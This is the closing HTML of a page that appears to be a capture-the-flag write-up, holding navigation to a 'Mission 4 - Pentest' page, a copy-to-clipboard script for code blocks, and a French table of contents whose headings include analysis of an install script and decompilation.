</a></span><span><a href=/docs/writeups/rootmepro2025/collapsed/mission4/ class="flex align-center book-icon"><span>Mission 4 - Pentest</span>
<img src=/svg/forward.svg class=book-icon alt=Next title="Mission 4 - Pentest"></a></span></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#brief-de-mission>Brief de mission</a></li><li><a href=#premiere-recherches>Premiere recherches</a></li><li><a href=#analyse-de-install_npdatesh>Analyse de install_npdate.sh</a></li><li><a href=#decompilation>Decompilation</a></li></ul></nav></div></aside></main></body></html>